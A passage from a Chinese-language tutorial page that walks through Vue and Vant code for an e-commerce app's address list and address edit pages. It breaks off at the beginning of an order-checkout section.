class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="address-list"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="地址列表"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line">    &lt;div v-if="list.length &gt; 0"&gt;</span><br><span class="line">      &lt;!-- 用于区分的文字 --&gt;</span><br><span class="line">      &lt;div class="address-list-header"&gt;</span><br><span class="line">        &lt;p class="header-text"&gt;请选择或管理收货地址&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- 地址列表 --&gt;</span><br><span class="line">      &lt;van-address-list</span><br><span class="line">        v-model="chosenAddressId"</span><br><span class="line">        :switchable="true"</span><br><span class="line">        :list="list"</span><br><span class="line">        :disabled-list="disabledList"</span><br><span class="line">        :disabled-text="disabledText"</span><br><span class="line">        default-tag-text="默认"</span><br><span class="line">        @add="onAdd"</span><br><span class="line">        @edit="onEdit"</span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;van-empty v-else description="空空如也"&gt;</span><br><span class="line">      &lt;van-button round type="danger" class="bottom-button" @click="onAdd"</span><br><span class="line">        &gt;添加地址&lt;/van-button</span><br><span class="line">      &gt;</span><br><span class="line">    &lt;/van-empty&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import { Toast } from "vant";</span><br><span class="line">import { mapActions, mapGetters } from "vuex";</span><br><span class="line"></span><br><span class="line">export default {</span><br><span class="line">  name: "AddressList",</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      // 默认选中的地址id</span><br><span class="line">      chosenAddressId: "",</span><br><span class="line">      // 地址列表</span><br><span class="line">      list: [],</span><br><span class="line">      // 禁用状态的地址列表（超出快递范围）</span><br><span class="line">      disabledList: [],</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  computed: {</span><br><span class="line">    ...mapGetters("AddressMap", ["codeToName"]),</span><br><span class="line">    ...mapGetters("Address", ["getDefaultAddressId"]),</span><br><span class="line">    disabledText() {</span><br><span class="line">      return this.disabledList.length &gt; 0 ? "以下地址超出配送范围" : "";</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  async created() {</span><br><span class="line">    try {</span><br><span class="line">      // 构建地区映射表</span><br><span class="line">      await this.buildReverseMaps();</span><br><span class="line"></span><br><span class="line">      // 获取地址列表</span><br><span class="line">      const response = await this.getAddressList();</span><br><span class="line">      // console.log('获取地址列表成功：', response)</span><br><span class="line">      const addressData = response.list || [];</span><br><span class="line">      // console.log('地址数据：', addressData)</span><br><span class="line"></span><br><span class="line">      // 格式化地址列表数据</span><br><span class="line">      this.list = addressData</span><br><span class="line">        .filter((item) =&gt; !item.is_disabled) // 过滤掉禁用的地址</span><br><span class="line">        .map((item) =&gt; ({</span><br><span class="line">          id: item.address_id,</span><br><span class="line">          name: item.name,</span><br><span class="line">          tel: item.phone,</span><br><span class="line">          address: this.formatAddress(item),</span><br><span class="line">          isDefault: item.is_default || false,</span><br><span class="line">        }));</span><br><span class="line"></span><br><span class="line">      // 从Vuex中获取默认地址的id</span><br><span class="line">      const defaultAddressId = this.getDefaultAddressId;</span><br><span class="line">      console.log("默认地址id：", defaultAddressId);</span><br><span class="line"></span><br><span class="line">      if (Number(defaultAddressId) !== -1) {</span><br><span class="line">        // 遍历比对列表每一项的id是否与defaultAddressId相等，找到后返回索引（强等于比较，注意类型）</span><br><span class="line">        const defaultIndex = this.list.findIndex(</span><br><span class="line">          (item) =&gt; Number(item.id) === Number(defaultAddressId)</span><br><span class="line">        );</span><br><span class="line">        if (Number(defaultIndex) !== -1) {</span><br><span class="line">          // 找到后设置为默认地址</span><br><span class="line">          this.list[defaultIndex].isDefault = true;</span><br><span class="line">          this.chosenAddressId = Number(defaultAddressId);</span><br><span class="line">        }</span><br><span class="line">      } else {</span><br><span class="line">        // Vuex没有默认地址，则默认选中第一个地址</span><br><span class="line">        Toast("小主还没有默认地址哦\n快来设置一个吧❤️");</span><br><span class="line">        console.log("未找到有效的默认地址");</span><br><span class="line">        this.chosenAddressId = this.list[0].id || "";</span><br><span class="line">      }</span><br><span class="line">      // 设置禁用的地址列表</span><br><span class="line">      this.disabledList = addressData</span><br><span class="line">        .filter((item) =&gt; item.is_disabled)</span><br><span class="line">        .map((item) =&gt; ({</span><br><span class="line">          id: item.address_id,</span><br><span class="line">          name: item.name,</span><br><span class="line">          tel: item.phone,</span><br><span class="line">          address: this.formatAddress(item),</span><br><span class="line">          isDefault: item.is_default || false,</span><br><span class="line">        }));</span><br><span class="line">    } catch (error) {</span><br><span class="line">      // console.error('获取地址列表失败：', error)</span><br><span class="line">      Toast.fail("获取地址列表失败");</span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    ...mapActions("Address", ["getAddressList"]),</span><br><span class="line">    ...mapActions("AddressMap", ["buildReverseMaps"]),</span><br><span class="line">    // 格式化地址：</span><br><span class="line">    formatAddress(item) {</span><br><span class="line">      const provinceName = this.codeToName(item.province_id) || "";</span><br><span class="line">      const cityName = this.codeToName(item.city_id) || "";</span><br><span class="line">      const countyName = this.codeToName(item.county_id) || "";</span><br><span class="line">      const detailAddress = item.detail || "";</span><br><span class="line">      const result = `${provinceName}${cityName}${countyName}${detailAddress}`;</span><br><span class="line">      // console.log('codeToname：', this.codeToName(item.province_id))</span><br><span class="line">      return result;</span><br><span class="line">    },</span><br><span class="line">    onAdd() {</span><br><span class="line">      this.$router.push("/address/edit?adsid=");</span><br><span class="line">    },</span><br><span class="line">    onEdit(item) {</span><br><span class="line">      // console.log('跳转到编辑：', item)</span><br><span class="line">      this.$router.push(`/address/edit?adsid=${item.id}`);</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang="less"&gt;</span><br><span class="line">.custom-nav-bar {</span><br><span class="line">  background-color: #ffffff; // 导航栏背景色</span><br><span class="line">  height: 50px; // 设置导航栏的高度</span><br><span class="line">  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); // 添加阴影效果</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.address-list {</span><br><span class="line">  padding-top: 60px; // 增加顶部内边距，以避免内容被导航栏遮挡</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.address-list-header {</span><br><span class="line">  padding: 10px 16px;</span><br><span class="line">  background-color: #f8f8f8;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.header-text {</span><br><span class="line">  font-size: 16px;</span><br><span class="line">  color: #333;</span><br><span class="line">  text-align: left;</span><br><span class="line">  margin: 0;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">/* 地址列表项样式 */</span><br><span class="line">.van-address-list__item {</span><br><span class="line">  margin-bottom: 10px; // 每一项之间的间距</span><br><span class="line">  padding: 10px 16px; // 内边距，使内容不贴边</span><br><span class="line">  border: 1px solid #ddd; // 边框颜色</span><br><span class="line">  border-radius: 4px; // 圆角边框</span><br><span class="line">  background-color: #fff; // 背景色</span><br><span class="line"></span><br><span class="line">  .van-cell__title,</span><br><span class="line">  .van-cell__label {</span><br><span class="line">    white-space: normal; // 允许内容换行</span><br><span class="line">    word-wrap: break-word; // 自动换行</span><br><span class="line">    word-break: break-all; // 长单词换行</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">/* 禁用状态的地址项样式 */</span><br><span class="line">.van-address-list__item--disabled {</span><br><span class="line">  background-color: #f5f5f5; // 禁用项的背景色</span><br><span class="line">  color: #999; // 禁用项的文字颜色</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="地址编辑"><a class="markdownIt-Anchor" href="#地址编辑"></a> 地址编辑</h3><p>地址编辑可以是新建也可以是更新操作：<code>views/address/edit.vue</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 可编辑也可以作为添加地址的页面 --&gt;</span><br><span class="line">  &lt;div class="address-list"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="地址编辑"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="address-edit"&gt;</span><br><span class="line">      &lt;van-address-edit</span><br><span class="line">        :address-info="addressInfo"</span><br><span class="line">        :area-list="areaList"</span><br><span class="line">        show-delete</span><br><span class="line">        :show-set-default="this.adsId != -1 ? true : false"</span><br><span class="line">        show-search-result</span><br><span class="line">        :search-result="searchResult"</span><br><span class="line">        :area-columns-placeholder="['请选择', '请选择', '请选择']"</span><br><span class="line">        :detail-maxlength="20"</span><br><span class="line">        @save="onSave"</span><br><span class="line">        @delete="onDelete"</span><br><span class="line">        @change-default="onChangeDefault"</span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import { Toast } from "vant";</span><br><span class="line">import { mapActions, mapGetters } from "vuex";</span><br><span class="line">import { areaList } from "@vant/area-data"; // 引入vant官方的地区数据</span><br><span class="line"></span><br><span class="line">export default {</span><br><span class="line">  name: "AddressEdit",</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      adsId: 0, // 地址id</span><br><span class="line">      addressInfo: {}, // 初始地址详情对象，若是新建地址则为空对象</span><br><span class="line">      areaList: areaList, // 地区列表</span><br><span class="line">      searchResult: [], // 详细地址搜索结果</span><br><span class="line">      checkDefault: false, // 默认地址的标识，数据内的isDefault会随着设置按钮而改变，此字段标识数据原始状态</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  computed: {</span><br><span class="line">    ...mapGetters("AddressMap", ["nameToCode", "codeToName"]),</span><br><span class="line">    // 获取要进行编辑的地址id，如果为空则赋值为-1表示为新建地址</span><br><span class="line">    getAdsId() {</span><br><span class="line">      return this.$route.query.adsid || -1;</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  async created() {</span><br><span class="line">    // 构建映射表</span><br><span class="line">    await this.buildReverseMaps();</span><br><span class="line"></span><br><span class="line">    // 获取要进行编辑的地址id，如果为空则赋值为-1表示为新建地址</span><br><span class="line">    this.adsId = this.getAdsId;</span><br><span class="line">    // console.log('adsId:', this.adsId)</span><br><span class="line"></span><br><span class="line">    // 如果adsId不等于-1，则进行地址详情的拉取</span><br><span class="line">    if (this.adsId !== -1) {</span><br><span class="line">      // 说明是编辑地址，则需要拉取地址详情</span><br><span class="line">      const {</span><br><span class="line">        data: { detail },</span><br><span class="line">      } = await this.getAddressDetail(this.adsId);</span><br><span class="line">      this.addressInfo = {</span><br><span class="line">        id: detail.address_id,</span><br><span class="line">        name: detail.name,</span><br><span class="line">        tel: detail.phone,</span><br><span class="line">        province: this.codeToName(detail.province_id) || "",</span><br><span class="line">        city: this.codeToName(detail.city_id) || "",</span><br><span class="line">        county: this.codeToName(detail.county_id) || "",</span><br><span class="line">        addressDetail: detail.detail,</span><br><span class="line">        areaCode: String(detail.region_id),</span><br><span class="line">        isDefault: this.isDefault,</span><br><span class="line">      };</span><br><span class="line">      // 从Vuex得到默认地址的id</span><br><span class="line">      const defaultAddressId = this.$store.state.Address.defaultAddressId;</span><br><span class="line">      // 比对当前地址是否为默认地址</span><br><span class="line">      if (Number(defaultAddressId) === Number(detail.address_id)) {</span><br><span class="line">        console.log("当前地址为默认地址");</span><br><span class="line">        this.addressInfo.isDefault = true; // 设置默认按钮为打开状态</span><br><span class="line">        this.checkDefault = true; // 为真说明该地址获取的时候就是默认地址</span><br><span class="line">      } else {</span><br><span class="line">        // 说明当前地址不是默认地址</span><br><span class="line">        console.log("当前地址不是默认地址");</span><br><span class="line">        this.addressInfo.isDefault = false; // 设置默认按钮为关闭状态</span><br><span class="line">        this.checkDefault = false; // 为假说明该地址获取的时候不是默认地址</span><br><span class="line">      }</span><br><span class="line">    } else {</span><br><span class="line">      // 说明是新建地址，不做操作</span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    ...mapActions("Address", [</span><br><span class="line">      "getAddressDetail",</span><br><span class="line">      "addAddress",</span><br><span class="line">      "updateAddress",</span><br><span class="line">    ]),</span><br><span class="line">    ...mapActions("AddressMap", ["buildReverseMaps"]),</span><br><span class="line"></span><br><span class="line">    // 保存地址</span><br><span class="line">    async onSave(content) {</span><br><span class="line">      // 判断是新建地址还是编辑地址</span><br><span class="line">      if (this.adsId === -1) {</span><br><span class="line">        // 新建地址</span><br><span class="line">        content.country = "中国";</span><br><span class="line">        this.addressInfo = content;</span><br><span class="line"></span><br><span class="line">        // 使用映射表进行地区数据处理</span><br><span class="line">        const region = [</span><br><span class="line">          {</span><br><span class="line">            value: Number(this.nameToCode(content.province)) || "",</span><br><span class="line">            label: content.province,</span><br><span class="line">          },</span><br><span class="line">          {</span><br><span class="line">            value: Number(this.nameToCode(content.city)) || "",</span><br><span class="line">            label: content.city,</span><br><span class="line">          },</span><br><span class="line">          {</span><br><span class="line">            value: Number(this.nameToCode(content.county)) || "",</span><br><span class="line">            label: content.county,</span><br><span class="line">          },</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        // 封装数据对象</span><br><span class="line">        const dataObj = {</span><br><span class="line">          name: this.addressInfo.name,</span><br><span class="line">          phone: this.addressInfo.tel,</span><br><span class="line">          region: region,</span><br><span class="line">          detail: this.addressInfo.addressDetail,</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        // 调用接口进行地址的保存</span><br><span class="line">        await this.addAddress(dataObj);</span><br><span class="line">        Toast("保存成功");</span><br><span class="line">        this.$router.replace({ path: "/address/manage" }); // 保存成功后返回地址列表页面</span><br><span class="line">      } else {</span><br><span class="line">        // 编辑地址</span><br><span class="line">        // console.log('编辑地址的content:', content)</span><br><span class="line">        this.addressInfo = content;</span><br><span class="line">        // 封装对象，用于发送请求</span><br><span class="line">        const dataObj = {</span><br><span class="line">          address_id: this.addressInfo.id,</span><br><span class="line">          form: {</span><br><span class="line">            name: this.addressInfo.name,</span><br><span class="line">            phone: this.addressInfo.tel,</span><br><span class="line">            region: [</span><br><span class="line">              {</span><br><span class="line">                label: this.addressInfo.province,</span><br><span class="line">                value: Number(this.nameToCode(this.addressInfo.province)) || "",</span><br><span class="line">              },</span><br><span class="line">              {</span><br><span class="line">                label: this.addressInfo.city,</span><br><span class="line">                value: Number(this.nameToCode(this.addressInfo.city)) || "",</span><br><span class="line">              },</span><br><span class="line">              {</span><br><span class="line">                label: this.addressInfo.county,</span><br><span class="line">                value: Number(this.nameToCode(this.addressInfo.county)) || "",</span><br><span class="line">              },</span><br><span class="line">            ],</span><br><span class="line">            detail: this.addressInfo.addressDetail,</span><br><span class="line">          },</span><br><span class="line">        };</span><br><span class="line">        // console.log('dataObj:', dataObj)</span><br><span class="line">        await this.updateAddress(dataObj);</span><br><span class="line">        Toast("保存成功");</span><br><span class="line"></span><br><span class="line">        // 处理默认地址的标识问题</span><br><span class="line">        if (this.checkDefault) {</span><br><span class="line">          // 为真说明当前编辑的是默认地址</span><br><span class="line">          console.log("当前是默认地址，content:", content);</span><br><span class="line">          console.log("当前是默认地址，this.adressInfo:", this.addressInfo);</span><br><span class="line"></span><br><span class="line">          if (content.isDefault !== this.checkDefault) {</span><br><span class="line">            // 说明用户取消了这个默认地址，需要将Vuex的默认地址id赋值为-1</span><br><span class="line">            this.$store.commit("Address/setDefaultAddressId", -1);</span><br><span class="line">          }</span><br><span class="line">          // 否则什么也不做</span><br><span class="line">        } else {</span><br><span class="line">          // 说明当前编辑的不是默认地址</span><br><span class="line">          console.log("当前不是默认地址，content:", content);</span><br><span class="line">          console.log("当前不是默认地址，this.adressInfo:", this.addressInfo);</span><br><span class="line"></span><br><span class="line">          if (content.isDefault !== this.checkDefault) {</span><br><span class="line">            // 说明用户将当前不是默认地址的地址设置为默认地址</span><br><span class="line">            this.$store.commit(</span><br><span class="line">              "Address/setDefaultAddressId",</span><br><span class="line">              this.addressInfo.id</span><br><span class="line">            );</span><br><span class="line">          }</span><br><span class="line">          // 否则什么也不做</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        // 处理完成后跳转会地址列表页</span><br><span class="line">        this.$router.replace({ path: "/address/manage" });</span><br><span class="line">      }</span><br><span class="line">    },</span><br><span class="line">    async onDelete() {</span><br><span class="line">      // 判断是否删除的是默认地址，如果是，则将Vuex的默认地址id赋值为-1</span><br><span class="line">      if (this.checkDefault) {</span><br><span class="line">        this.$store.commit("Address/setDefaultAddressId", -1);</span><br><span class="line">        console.log(</span><br><span class="line">          "删除默认地址, Vuex的默认地址id:",</span><br><span class="line">          this.$store.state.Address.defaultAddressId</span><br><span class="line">        );</span><br><span class="line">      }</span><br><span class="line">      await this.$store.dispatch("Address/deleteAddress", this.addressInfo.id);</span><br><span class="line">      Toast("删除成功");</span><br><span class="line">      setTimeout(() =&gt; {</span><br><span class="line">        this.$router.replace("/address/manage");</span><br><span class="line">      }, 1000);</span><br><span class="line">    },</span><br><span class="line">    // 设置默认地址</span><br><span class="line">    onChangeDefault(val) {</span><br><span class="line">      // console.log(val)</span><br><span class="line">      // 只有编辑才可以设置默认地址</span><br><span class="line">      this.addressInfo.isDefault = val;</span><br><span class="line">      console.log(</span><br><span class="line">        "设置默认地址的按钮被触发, this.addressInfo.isDefault:",</span><br><span class="line">        this.addressInfo.isDefault</span><br><span class="line">      );</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang="less"&gt;</span><br><span class="line">.address-list {</span><br><span class="line">  padding-top: 60px; /* 增加与导航栏等高的内边距，避免内容被导航栏覆盖 */</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.address-edit {</span><br><span class="line">  padding: 10px 16px; /* 给地址编辑区域增加一些内边距，使内容不贴边 */</span><br><span class="line">  background-color: #fff; /* 设置背景色为白色 */</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>导入 vant 组件略过。</p><h2 id="订单结算台"><a class="markdownIt-Anchor" href="#订单结算台"></a> 订单结算台</h2><h3 id="静态结构-2"><a class="markdownIt-Anchor" href="#静态结构-2"></a> 静态结构</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 